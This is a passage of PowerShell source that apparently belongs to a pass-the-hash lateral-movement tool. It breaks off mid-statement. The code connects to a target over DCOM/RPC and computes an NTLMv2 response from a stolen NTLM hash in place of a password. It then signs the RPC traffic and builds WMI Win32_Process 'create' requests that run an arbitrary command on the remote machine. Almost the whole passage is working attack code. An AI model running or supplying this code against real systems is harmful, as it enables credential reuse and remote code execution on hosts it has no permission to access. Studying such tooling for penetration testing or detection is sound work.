        [Byte[]]$unused_buffer_bytes = $unused_buffer.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $packet_DCOM_remote_create_instance = Get-PacketDCOMRemoteCreateInstance $causality_ID_bytes $target_short
        $DCOM_remote_create_instance = ConvertFrom-PacketOrderedDictionary $packet_DCOM_remote_create_instance
        $packet_RPC = Get-PacketRPCRequest 0x03 $DCOM_remote_create_instance.Length 0 0 0x03,0x00,0x00,0x00 0x01,0x00 0x04,0x00
        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
        $WMI_client_send = $RPC + $DCOM_remote_create_instance
        $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
        $WMI_client_stream.Flush()    
        $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null

        if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
        {
            Write-Output "$output_username WMI access denied on $target_long"    
        }
        elseif($WMI_client_receive[2] -eq 3)
        {
            $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
            $error_code = $error_code -replace "-",""
            Write-Output "Error code 0x$error_code"
        }
        elseif($WMI_client_receive[2] -eq 2 -and !$WMI_execute)
        {
            Write-Output "$output_username accessed WMI on $target_long"
        }
        elseif($WMI_client_receive[2] -eq 2)
        {
            
            Write-Verbose "$output_username accessed WMI on $target_long"

            if($target_short -eq '127.0.0.1')
            {
                $target_short = $auth_hostname
            }

            $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
            $target_search = [System.BitConverter]::ToString($target_unicode)
            $target_search = $target_search -replace "-",""
            $WMI_message = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_message = $WMI_message -replace "-",""
            $target_index = $WMI_message.IndexOf($target_search)

            if($target_index -lt 1)
            {
                $target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList

                ForEach($IP_address in $target_address_list)
                {
                    $target_short = $IP_address.IPAddressToString
                    $target_unicode = 0x07,0x00 + [System.Text.Encoding]::Unicode.GetBytes($target_short + "[")
                    $target_search = [System.BitConverter]::ToString($target_unicode)
                    $target_search = $target_search -replace "-",""
                    $target_index = $WMI_message.IndexOf($target_search)

                    if($target_index -gt 0)
                    {
                        break
                    }

                }

            }

            if($target_long -cne $target_short)
            {
                Write-Verbose "Using $target_short for random port extraction"
            }

            if($target_index -gt 0)
            {
                $target_bytes_index = $target_index / 2
                $WMI_random_port = $WMI_client_receive[($target_bytes_index + $target_unicode.Length)..($target_bytes_index + $target_unicode.Length + 8)]
                $WMI_random_port = [System.BitConverter]::ToString($WMI_random_port)
                $WMI_random_port_end_index = $WMI_random_port.IndexOf("-5D")

                if($WMI_random_port_end_index -gt 0)
                {
                    $WMI_random_port = $WMI_random_port.SubString(0,$WMI_random_port_end_index)
                }

                $WMI_random_port = $WMI_random_port -replace "-00",""
                $WMI_random_port = $WMI_random_port.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                [Int]$WMI_random_port_int = -join $WMI_random_port 
                $MEOW = [System.BitConverter]::ToString($WMI_client_receive)
                $MEOW = $MEOW -replace "-",""
                $MEOW_index = $MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820")
                $MEOW_bytes_index = $MEOW_index / 2
                $OXID = $WMI_client_receive[($MEOW_bytes_index + 32)..($MEOW_bytes_index + 39)]
                $IPID = $WMI_client_receive[($MEOW_bytes_index + 48)..($MEOW_bytes_index + 63)]
                $OXID = [System.BitConverter]::ToString($OXID)
                $OXID = $OXID -replace "-",""
                $OXID_index = $MEOW.IndexOf($OXID,$MEOW_index + 100)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID = $WMI_client_receive[($OXID_bytes_index + 12)..($OXID_bytes_index + 27)]
                $WMI_client_random_port = New-Object System.Net.Sockets.TCPClient
                $WMI_client_random_port.Client.ReceiveTimeout = 30000
            }

            if($WMI_random_port)
            {

                Write-Verbose "Connecting to $target_long`:$WMI_random_port_int"

                try
                {
                    $WMI_client_random_port.Connect($target_long,$WMI_random_port_int)
                }
                catch
                {
                    Write-Output "$target_long`:$WMI_random_port_int did not respond"
                }

            }
            else
            {
                Write-Output "Random port extraction failure"
            }

        }
        else
        {
            Write-Output "Something went wrong"
        }

        if($WMI_client_random_port.Connected)
        {
            $WMI_client_random_port_stream = $WMI_client_random_port.GetStream()
            $packet_RPC = Get-PacketRPCBind 2 0xd0,0x16 0x03 0x00,0x00 0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 0x00,0x00
            $packet_RPC["RPCBind_FragLength"] = 0xd0,0x00
            $packet_RPC["RPCBind_AuthLength"] = 0x28,0x00
            $packet_RPC["RPCBind_AuthLevel"] = 0x04
            $packet_RPC["RPCBind_NegotiateFlags"] = 0x97,0x82,0x08,0xa2
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()    
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $assoc_group = $WMI_client_receive[20..23]
            $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
            $WMI_NTLMSSP = $WMI_NTLMSSP -replace "-",""
            $WMI_NTLMSSP_index = $WMI_NTLMSSP.IndexOf("4E544C4D53535000")
            $WMI_NTLMSSP_bytes_index = $WMI_NTLMSSP_index / 2
            $WMI_domain_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 12) $WMI_client_receive
            $WMI_target_length = DataLength2 ($WMI_NTLMSSP_bytes_index + 40) $WMI_client_receive
            $WMI_session_ID = $WMI_client_receive[44..51]
            $WMI_NTLM_challenge = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 24)..($WMI_NTLMSSP_bytes_index + 31)]
            $WMI_target_details = $WMI_client_receive[($WMI_NTLMSSP_bytes_index + 56 + $WMI_domain_length)..($WMI_NTLMSSP_bytes_index + 55 + $WMI_domain_length + $WMI_target_length)]
            $WMI_target_time_bytes = $WMI_target_details[($WMI_target_details.Length - 12)..($WMI_target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (get-childitem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain = $Domain
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)
            $auth_domain_length = $auth_domain_length[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)
            $auth_username_length = $auth_username_length[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)
            $auth_hostname_length = $auth_hostname_length[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $WMI_target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $WMI_NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)
            $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)

            $client_signing_constant = 0x73,0x65,0x73,0x73,0x69,0x6f,0x6e,0x20,0x6b,0x65,0x79,0x20,0x74,0x6f,0x20,
                                        0x63,0x6c,0x69,0x65,0x6e,0x74,0x2d,0x74,0x6f,0x2d,0x73,0x65,0x72,0x76,
                                        0x65,0x72,0x20,0x73,0x69,0x67,0x6e,0x69,0x6e,0x67,0x20,0x6b,0x65,0x79,
                                        0x20,0x6d,0x61,0x67,0x69,0x63,0x20,0x63,0x6f,0x6e,0x73,0x74,0x61,0x6e,
                                        0x74,0x00

            $MD5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
            $client_signing_key = $MD5.ComputeHash($session_base_key + $client_signing_constant)
            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)
            $NTLMv2_response_length = $NTLMv2_response_length[0,1]
            $WMI_session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)
            $WMI_session_key_length = 0x00,0x00
            $WMI_negotiate_flags = 0x15,0x82,0x88,0xa2

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $WMI_session_key_length +
                                    $WMI_session_key_length +
                                    $WMI_session_key_offset +
                                    $WMI_negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            $HMAC_MD5.key = $client_signing_key
            [Byte[]]$sequence_number = 0x00,0x00,0x00,0x00
            $packet_RPC = Get-PacketRPCAUTH3 $NTLMSSP_response
            $packet_RPC["RPCAUTH3_CallID"] = 0x02,0x00,0x00,0x00
            $packet_RPC["RPCAUTH3_AuthLevel"] = 0x04
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $WMI_client_send = $RPC
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()
            $packet_RPC = Get-PacketRPCRequest 0x83 76 16 4 0x02,0x00,0x00,0x00 0x00,0x00 0x03,0x00 $object_UUID
            $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
            $packet_NTLMSSP_verifier = Get-PacketNTLMSSPVerifier 4 0x04 $sequence_number
            $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
            $rem_query_interface = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $HMAC_MD5.key = $client_signing_key
            $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $rem_query_interface + $NTLMSSP_verifier[0..11])
            $RPC_signature = $RPC_signature[0..7]
            $packet_NTLMSSP_verifier["NTLMSSPVerifier_NTLMSSPVerifierChecksum"] = $RPC_signature
            $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
            $WMI_client_send = $RPC + $rem_query_interface + $NTLMSSP_verifier
            $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
            $WMI_client_random_port_stream.Flush()    
            $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
            $WMI_client_stage = 'exit'

            if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
            {
                Write-Output "$output_username WMI access denied on $target_long"   
            }
            elseif($WMI_client_receive[2] -eq 3)
            {
                $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                $error_code = $error_code -replace "-",""
                Write-Output "Failed with error code 0x$error_code"
            }
            elseif($WMI_client_receive[2] -eq 2)
            {
                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                $WMI_data = $WMI_data -replace "-",""
                $OXID_index = $WMI_data.IndexOf($OXID)
                $OXID_bytes_index = $OXID_index / 2
                $object_UUID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                $WMI_client_stage = 'AlterContext'
            }
            else
            {
                Write-Output "Something went wrong"
            }

            Write-Verbose "Attempting command execution"
            $request_split_index = 5500

            :WMI_execute_loop while ($WMI_client_stage -ne 'exit')
            {

                if($WMI_client_receive[2] -eq 3)
                {
                    $error_code = [System.BitConverter]::ToString($WMI_client_receive[27..24])
                    $error_code = $error_code -replace "-",""
                    Write-Output "Failed with error code 0x$error_code"
                    $WMI_client_stage = 'exit'
                }

                switch ($WMI_client_stage)
                {
            
                    'AlterContext'
                    {

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $alter_context_call_ID = 0x03,0x00,0x00,0x00
                                $alter_context_context_ID = 0x02,0x00
                                $alter_context_UUID = 0xd6,0x1c,0x78,0xd4,0xd3,0xe5,0xdf,0x44,0xad,0x94,0x93,0x0e,0xfe,0x48,0xa8,0x87
                                $WMI_client_stage_next = 'Request'
                            }

                            1
                            {
                                $alter_context_call_ID = 0x04,0x00,0x00,0x00 
                                $alter_context_context_ID = 0x03,0x00
                                $alter_context_UUID = 0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20
                                $WMI_client_stage_next = 'Request'
                            }

                            6
                            {
                                $alter_context_call_ID = 0x09,0x00,0x00,0x00 
                                $alter_context_context_ID = 0x04,0x00
                                $alter_context_UUID = 0x99,0xdc,0x56,0x95,0x8c,0x82,0xcf,0x11,0xa3,0x7e,0x00,0xaa,0x00,0x32,0x40,0xc7
                                $WMI_client_stage_next = 'Request'
                            }

                        }

                        $packet_RPC = Get-PacketRPCAlterContext $assoc_group $alter_context_call_ID $alter_context_context_ID $alter_context_UUID
                        $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                        $WMI_client_send = $RPC
                        $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
                        $WMI_client_random_port_stream.Flush()    
                        $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                        $WMI_client_stage = $WMI_client_stage_next
                    }
                  
                    'Request'
                    {
                        $request_split = $false

                        switch ($sequence_number[0])
                        {

                            0
                            {
                                $sequence_number = 0x01,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 12
                                $request_call_ID = 0x03,0x00,0x00,0x00
                                $request_context_ID = 0x02,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID2
                                $hostname_length = [System.BitConverter]::GetBytes($auth_hostname.Length + 1)
                                $WMI_client_stage_next = 'AlterContext'

                                if([Bool]($auth_hostname.Length % 2))
                                {
                                    $auth_hostname_bytes += 0x00,0x00
                                }
                                else
                                {
                                    $auth_hostname_bytes += 0x00,0x00,0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                $causality_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 + 
                                                $hostname_length +
                                                0x00,0x00,0x00,0x00 +
                                                $hostname_length +
                                                $auth_hostname_bytes +
                                                $process_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            1
                            {
                                $sequence_number = 0x02,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x04,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $IPID
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
                                                $causality_ID_bytes + 
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                            }

                            2
                            {
                                $sequence_number = 0x03,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x05,0x00,0x00,0x00
                                $request_context_ID = 0x03,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID
                                [Byte[]]$WMI_namespace_length = [System.BitConverter]::GetBytes($target_short.Length + 14)
                                [Byte[]]$WMI_namespace_unicode = [System.Text.Encoding]::Unicode.GetBytes("\\$target_short\root\cimv2")
                                $WMI_client_stage_next = 'Request'

                                if([Bool]($target_short.Length % 2))
                                {
                                    $WMI_namespace_unicode += 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    $WMI_namespace_unicode += 0x00,0x00
                                }

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $WMI_namespace_length +
                                                0x00,0x00,0x00,0x00 +
                                                $WMI_namespace_length +
                                                $WMI_namespace_unicode +
                                                0x04,0x00,0x02,0x00,0x09,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x09,
                                                0x00,0x00,0x00,0x65,0x00,0x6e,0x00,0x2d,0x00,0x55,0x00,0x53,0x00,
                                                0x2c,0x00,0x65,0x00,0x6e,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00

                            }

                            3
                            {
                                $sequence_number = 0x04,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 8
                                $request_call_ID = 0x06,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x05,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $WMI_data = [System.BitConverter]::ToString($WMI_client_receive)
                                $WMI_data = $WMI_data -replace "-",""
                                $OXID_index = $WMI_data.IndexOf($OXID)
                                $OXID_bytes_index = $OXID_index / 2
                                $IPID2 = $WMI_client_receive[($OXID_bytes_index + 16)..($OXID_bytes_index + 31)]
                                $packet_rem_release = Get-PacketDCOMRemRelease $causality_ID_bytes $object_UUID2 $IPID
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_release
                            }

                            4
                            {
                                $sequence_number = 0x05,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x07,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'Request'
                                $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x9e,0xc1,0xfc,0xc3,0x70,0xa9,0xd2,0x11,0x8b,0x5a,0x00,0xa0,0xc9,0xb7,0xc9,0xc4
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            5
                            {
                                $sequence_number = 0x06,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 4
                                $request_call_ID = 0x08,0x00,0x00,0x00
                                $request_context_ID = 0x00,0x00
                                $request_opnum = 0x03,0x00
                                $request_UUID = $object_UUID
                                $WMI_client_stage_next = 'AlterContext'
                                $packet_rem_query_interface = Get-PacketDCOMRemQueryInterface $causality_ID_bytes $IPID2 0x83,0xb2,0x96,0xb1,0xb4,0xba,0x1a,0x10,0xb6,0x9c,0x00,0xaa,0x00,0x34,0x1d,0x07
                                $stub_data = ConvertFrom-PacketOrderedDictionary $packet_rem_query_interface
                            }

                            6
                            {
                                $sequence_number = 0x07,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x09,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            7
                            {
                                $sequence_number = 0x08,0x00,0x00,0x00
                                $request_flags = 0x83
                                $request_auth_padding = 0
                                $request_call_ID = 0x10,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x06,0x00
                                $request_UUID = $IPID2
                                $WMI_client_stage_next = 'Request'

                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x77,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x70,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00

                            }

                            {$_ -ge 8}
                            {
                                $sequence_number = 0x09,0x00,0x00,0x00
                                $request_auth_padding = 0
                                $request_call_ID = 0x0b,0x00,0x00,0x00
                                $request_context_ID = 0x04,0x00
                                $request_opnum = 0x18,0x00
                                $request_UUID = $IPID2
                                [Byte[]]$stub_length = [System.BitConverter]::GetBytes($Command.Length + 1769)
                                $stub_length = $stub_length[0,1]
                                [Byte[]]$stub_length2 = [System.BitConverter]::GetBytes($Command.Length + 1727)
                                $stub_length2 = $stub_length2[0,1]
                                [Byte[]]$stub_length3 = [System.BitConverter]::GetBytes($Command.Length + 1713)
                                $stub_length3 = $stub_length3[0,1]
                                [Byte[]]$command_length = [System.BitConverter]::GetBytes($Command.Length + 93)
                                $command_length = $command_length[0,1]
                                [Byte[]]$command_length2 = [System.BitConverter]::GetBytes($Command.Length + 16)
                                $command_length2 = $command_length2[0,1]
                                [Byte[]]$command_bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)


                                # thanks to @vysec for finding a bug with certain command lengths
                                [String]$command_padding_check = $Command.Length / 4
                                
                                if($command_padding_check -like "*.75")
                                {
                                    $command_bytes += 0x00
                                }
                                elseif($command_padding_check -like "*.5")
                                {
                                    $command_bytes += 0x00,0x00
                                }
                                elseif($command_padding_check -like "*.25")
                                {
                                    $command_bytes += 0x00,0x00,0x00
                                }
                                else
                                {
                                    $command_bytes += 0x00,0x00,0x00,0x00
                                }
                                
                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                $causality_ID_bytes +
                                                0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
                                                0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,
                                                0x33,0x00,0x32,0x00,0x5f,0x00,0x50,0x00,0x72,0x00,0x6f,0x00,0x63,
                                                0x00,0x65,0x00,0x73,0x00,0x73,0x00,0x00,0x00,0x55,0x73,0x65,0x72,
                                                0x06,0x00,0x00,0x00,0x0c,0x00,0x00,0x00,0x06,0x00,0x00,0x00,0x63,
                                                0x00,0x72,0x00,0x65,0x00,0x61,0x00,0x74,0x00,0x65,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                $stub_length +
                                                0x00,0x00 +
                                                $stub_length +
                                                0x00,0x00,0x4d,0x45,0x4f,0x57,0x04,0x00,0x00,0x00,0x81,0xa6,0x12,
                                                0xdc,0x7f,0x73,0xcf,0x11,0x88,0x4d,0x00,0xaa,0x00,0x4b,0x2e,0x24,
                                                0x12,0xf8,0x90,0x45,0x3a,0x1d,0xd0,0x11,0x89,0x1f,0x00,0xaa,0x00,
                                                0x4b,0x2e,0x24,0x00,0x00,0x00,0x00 +
                                                $stub_length2 +
                                                0x00,0x00,0x78,0x56,0x34,0x12 +
                                                $stub_length3 +
                                                0x00,0x00,0x02,0x53,
                                                0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0d,0x00,0x00,0x00,0x04,
                                                0x00,0x00,0x00,0x0f,0x00,0x00,0x00,0x0e,0x00,0x00,0x00,0x00,0x0b,
                                                0x00,0x00,0x00,0xff,0xff,0x03,0x00,0x00,0x00,0x2a,0x00,0x00,0x00,
                                                0x15,0x01,0x00,0x00,0x73,0x01,0x00,0x00,0x76,0x02,0x00,0x00,0xd4,
                                                0x02,0x00,0x00,0xb1,0x03,0x00,0x00,0x15,0xff,0xff,0xff,0xff,0xff,
                                                0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x12,0x04,0x00,0x80,0x00,0x5f,
                                                0x5f,0x50,0x41,0x52,0x41,0x4d,0x45,0x54,0x45,0x52,0x53,0x00,0x00,
                                                0x61,0x62,0x73,0x74,0x72,0x61,0x63,0x74,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x00,
                                                0x00,0x00,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,0x69,0x6e,0x65,
                                                0x00,0x00,0x73,0x74,0x72,0x69,0x6e,0x67,0x00,0x08,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x11,0x00,0x00,
                                                0x00,0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,
                                                0x00,0x00,0x49,0x6e,0x00,0x08,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x1c,0x00,0x00,0x00,0x0a,0x00,0x00,
                                                0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,0x5e,0x00,0x00,
                                                0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0x01,0x00,0x00,0x00,0x94,
                                                0x00,0x00,0x00,0x00,0x57,0x69,0x6e,0x33,0x32,0x41,0x50,0x49,0x7c,
                                                0x50,0x72,0x6f,0x63,0x65,0x73,0x73,0x20,0x61,0x6e,0x64,0x20,0x54,
                                                0x68,0x72,0x65,0x61,0x64,0x20,0x46,0x75,0x6e,0x63,0x74,0x69,0x6f,
                                                0x6e,0x73,0x7c,0x6c,0x70,0x43,0x6f,0x6d,0x6d,0x61,0x6e,0x64,0x4c,
                                                0x69,0x6e,0x65,0x20,0x00,0x00,0x4d,0x61,0x70,0x70,0x69,0x6e,0x67,
                                                0x53,0x74,0x72,0x69,0x6e,0x67,0x73,0x00,0x08,0x00,0x00,0x00,0x00,
                                                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x29,0x00,0x00,0x00,
                                                0x0a,0x00,0x00,0x80,0x03,0x08,0x00,0x00,0x00,0x37,0x00,0x00,0x00,
                                                0x5e,0x00,0x00,0x00,0x02,0x0b,0x00,0x00,0x00,0xff,0xff,0xca,0x00,
                                                0x00,0x00,0x02,0x08,0x20,0x00,0x00,0x8c,0x00,0x00,0x00,0x00,0x49,
